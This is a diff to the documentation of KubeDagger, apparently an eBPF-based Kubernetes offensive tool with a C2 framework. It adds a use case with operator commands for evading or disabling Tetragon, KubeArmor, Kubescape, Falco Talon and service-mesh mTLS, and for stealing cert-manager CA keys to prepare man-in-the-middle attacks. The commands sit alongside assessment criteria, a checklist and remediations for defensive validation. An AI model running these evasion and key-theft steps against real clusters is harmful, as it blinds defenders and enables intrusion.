@@ -19,6 +19,7 @@
 - [Use Case 8: Service Mesh Security Validation](#use-case-8-service-mesh-security-validation)
 - [Use Case 9: Autonomous Objective Campaigns](#use-case-9-autonomous-objective-campaigns)
 - [Use Case 10: Cloud Provider Exploitation Testing](#use-case-10-cloud-provider-exploitation-testing)
+- [Use Case 11: CNCF Security Product Evasion Testing](#use-case-11-cncf-security-product-evasion-testing)
 - [Architecture Deep Dive](#architecture-deep-dive)
 - [MITRE ATT&CK Coverage](#mitre-attck-coverage)
 - [Deployment Scenarios](#deployment-scenarios)
@@ -29,19 +30,20 @@
 
 ## Overview
 
-KubeDagger is an eBPF-based offensive security research tool with a cross-platform HTTP/2 command-and-control (C2) framework. It demonstrates 57+ offensive techniques spanning the full Kubernetes attack lifecycle — from initial access and privilege escalation through lateral movement, data exfiltration, and persistence.
+KubeDagger is an eBPF-based offensive security research tool with a cross-platform HTTP/2 command-and-control (C2) framework. It demonstrates 70+ offensive techniques spanning the full Kubernetes attack lifecycle — from initial access and privilege escalation through lateral movement, data exfiltration, and persistence.
 
 **Purpose:** Authorized security testing, red team operations, detection engineering validation, and educational research in cloud-native environments.
 
 **Key capabilities:**
 - Kernel-level stealth via eBPF (Linux)
 - Cross-platform C2 (Linux, Windows, macOS)
-- 57+ offensive techniques with MITRE ATT&CK mapping
+- 70+ offensive techniques with MITRE ATT&CK mapping
 - Autonomous objective-driven campaign planning
 - Multi-cluster propagation
 - Cloud provider exploitation (AWS, GCP, Azure)
 - CI/CD pipeline poisoning
 - Service mesh deep attacks
+- Adversarial evasion of CNCF security products (Tetragon, KubeArmor, Kubescape, Falco Talon, service mesh mTLS, cert-manager)
 
 ---
 
@@ -834,6 +836,165 @@ kubedagger-client cloud meta --provider azure
 - [ ] Cloud audit logs capture all API calls from pods
 - [ ] CSPM alerts on IAM escalation patterns
 - [ ] Network policies block metadata endpoint access
+
+---
+
+## Use Case 11: CNCF Security Product Evasion Testing
+
+### Scenario
+A security team deploys multiple CNCF security products (Tetragon, KubeArmor, Kubescape, Falco Talon) and wants to validate that these tools actually detect and prevent advanced adversarial techniques. This use case exercises the adversarial capabilities against each product to identify detection gaps and validate response effectiveness.
+
+### How-To: Tetragon eBPF Runtime Evasion
+
+```shell
+# Detect Tetragon deployment and version
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=tetragon technique=policy_gaps
+
+# Bypass kprobe/tracepoint hooks via io_uring (syscalls not hooked by eBPF)
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=tetragon technique=io_uring
+
+# Overload Tetragon's perf ringbuffer causing event drops
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=tetragon technique=ringbuf_flood
+
+# Disable TracingPolicy CRDs to reduce monitoring scope
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=tetragon technique=disable_policy
+```
+
+**Assessment criteria:**
+- Did Tetragon detect the io_uring-based file/network operations?
+- Were ringbuffer overflow events logged or alerted?
+- Is TracingPolicy modification detected by audit logging?
+
+### How-To: KubeArmor LSM Enforcement Evasion
+
+```shell
+# Enumerate KubeArmor policies and find unconfined pods
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=kubearmor technique=policy_audit
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=kubearmor technique=unconfined
+
+# Inject into an already-allowed process to bypass enforcement
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=kubearmor technique=process_inject
+
+# Deploy an allow-all policy to neutralize enforcement
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=kubearmor technique=allow_all
+```
+
+**Assessment criteria:**
+- Are there pods without KubeArmor policy coverage?
+- Does KubeArmor detect process injection into allowed binaries?
+- Is unauthorized KubeArmorPolicy creation detected?
+
+### How-To: Kubescape Posture Evasion
+
+```shell
+# Identify scan intervals and operate between them
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=kubescape technique=scan_timing
+
+# Modify labels to match exclusion patterns
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=kubescape technique=label_exclusion
+
+# Suspend scan CronJobs to disable posture checks
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=kubescape technique=disable_scans
+
+# Modify Kubescape configuration to exclude namespaces
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=kubescape technique=config_modify
+```
+
+**Assessment criteria:**
+- How long is the gap between posture scans?
+- Are excluded namespaces/labels audited?
+- Is CronJob suspension detected by monitoring?
+
+### How-To: Falco Talon Response Engine Evasion
+
+```shell
+# Trigger decoy attacks to divert automated response
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=talon technique=decoy
+
+# Saturate Falco's event pipeline to overwhelm Talon's input
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=talon technique=saturate
+
+# Race against Talon's response cycle (act before response executes)
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=talon technique=response_race
+
+# Modify Talon response rules via ConfigMap manipulation
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=talon technique=rule_modify
+```
+
+**Assessment criteria:**
+- Does Talon respond to decoys while the real attack proceeds?
+- Can event saturation cause Talon to drop legitimate alerts?
+- What is Talon's response latency (is a race viable)?
+
+### How-To: Service Mesh Security Bypass
+
+```shell
+# Bypass sidecar injection via host networking
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=mesh_security technique=host_network
+
+# Race against sidecar init container for pre-injection access
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=mesh_security technique=init_race
+
+# Flush sidecar iptables rules from within the pod
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=mesh_security technique=iptables_bypass
+
+# Disable sidecar injection webhook entirely
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=mesh_security technique=disable_injection
+```
+
+**Assessment criteria:**
+- Can pods communicate without mTLS via host networking?
+- Is the init container race window exploitable?
+- Are iptables modifications in sidecar-injected pods monitored?
+
+### How-To: cert-manager Exploitation
+
+```shell
+# Enumerate all issuers and certificates in the cluster
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=certmanager technique=enumerate
+
+# Issue a certificate for arbitrary domains using cluster issuer
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=certmanager technique=issue_cert
+
+# Steal CA private key from the issuer's secret
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=certmanager technique=steal_ca
+
+# Prepare for man-in-the-middle attack using issued certificates
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=certmanager technique=mitm_prep
+```
+
+**Assessment criteria:**
+- Are CA secrets accessible from workload namespaces?
+- Is unauthorized Certificate resource creation monitored?
+- Does mTLS rotation detect rogue certificates?
+
+### CNCF Security Validation Checklist
+
+- [ ] Tetragon TracingPolicies cover io_uring syscalls (not just kprobes)
+- [ ] Tetragon ringbuffer size is adequate for burst traffic
+- [ ] KubeArmor policies cover ALL workload pods (no unconfined gaps)
+- [ ] KubeArmor detects process injection / path substitution
+- [ ] Kubescape scans run frequently enough (< 1 hour intervals)
+- [ ] Kubescape CronJob modifications trigger alerts
+- [ ] Falco Talon response latency is under 2 seconds
+- [ ] Falco pipeline handles burst event volume without drops
+- [ ] Service mesh mTLS is STRICT mode (not PERMISSIVE)
+- [ ] Sidecar injection webhook has failurePolicy=Fail
+- [ ] cert-manager CA secrets are restricted by RBAC
+- [ ] Certificate issuance is audited and anomalous domains alerted
+
+### Remediation Guidance
+
+| Finding | Remediation |
+|---------|-------------|
+| io_uring bypasses Tetragon | Add io_uring_enter to TracingPolicy kprobe list |
+| Ringbuffer overflow drops events | Increase perf_event_array size, enable event export to secondary sink |
+| Unconfined pods in KubeArmor | Deploy default-deny KubeArmorClusterPolicy |
+| Process injection undetected | Enable KubeArmor's process whitelisting with hash verification |
+| Long scan intervals (Kubescape) | Increase scan frequency, add admission-time scanning |
+| Talon response race viable | Reduce Talon polling interval, use synchronous admission webhooks |
+| Host networking bypasses mesh | Enforce PodSecurity with restricted hostNetwork=false |
+| CA key accessible | Restrict cert-manager secrets to cert-manager namespace only |
 
 ---
 
